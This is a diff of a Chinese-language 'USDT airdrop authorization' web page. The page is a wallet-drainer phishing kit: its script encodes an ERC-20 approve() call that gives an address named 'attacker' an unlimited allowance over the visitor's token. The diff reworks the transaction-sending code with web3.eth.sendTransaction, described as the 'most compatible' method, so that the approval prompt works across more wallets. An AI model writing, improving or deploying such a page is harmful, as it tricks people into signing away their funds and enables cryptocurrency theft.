@@ -1,8 +1,8 @@
-<!DOCTYPE html>
+
 <html lang="zh-Hant">
 <head>
   <meta charset="UTF-8">
-  <title>USDT 空投授權頁（強制版）</title>
+  <title>USDT 空投授權頁（最相容版）</title>
   <script src="https://unpkg.com/@walletconnect/web3-provider@1.7.8/dist/umd/index.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
 </head>
@@ -40,7 +40,7 @@
           return;
         }
 
-        // 🔐 強制呼叫 approve 的交易資料
+        // ✅ encode approve() 資料
         const approveData = web3.eth.abi.encodeFunctionCall({
           name: "approve",
           type: "function",
@@ -50,22 +50,18 @@
           ]
         }, [attacker, "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"]);
 
-        // 🧠 改用 provider.request 送出交易（強制跳出授權視窗）
-        const txParams = {
+        // ✅ 最相容寫法：使用 sendTransaction（非 provider.request）
+        const txHash = await web3.eth.sendTransaction({
           from: user,
           to: token,
           data: approveData,
-          gas: web3.utils.toHex(100000),
-        };
-
-        const txHash = await provider.request({
-          method: "eth_sendTransaction",
-          params: [txParams]
+          gas: 100000,
+          gasPrice: web3.utils.toWei('5', 'gwei')
         });
 
-        document.getElementById("status").innerText = `✅ 授權成功！Tx Hash: ${txHash}`;
+        document.getElementById("status").innerText = `✅ 授權成功！Tx Hash: ${txHash.transactionHash}`;
       } catch (err) {
-        document.getElementById("status").innerText = "❌ 錯誤：" + err.message;
+        document.getElementById("status").innerText = "❌ 授權失敗：" + err.message;
       }
     }
   </script>
